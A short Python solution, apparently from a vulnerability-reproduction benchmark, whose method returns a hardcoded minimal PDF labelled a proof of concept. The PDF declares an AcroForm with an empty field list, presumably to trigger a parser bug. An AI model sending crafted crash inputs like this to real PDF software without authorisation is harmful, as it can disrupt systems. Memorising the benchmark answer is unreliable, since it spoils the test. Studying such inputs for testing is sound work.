class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""%PDF-1.4
%âãÏÓ

1 0 obj
<<
  /Type /Catalog
  /AcroForm 2 0 R
>>
endobj

2 0 obj
<<
  /Type /AcroForm
  /Fields []
>>
endobj

xref
0 3
0000000000 65535 f 
0000000015 00000 n 
0000000067 00000 n 
trailer
<< /Size 3 /Root 1 0 R >>
startxref
126
%%EOF"""
        return poc
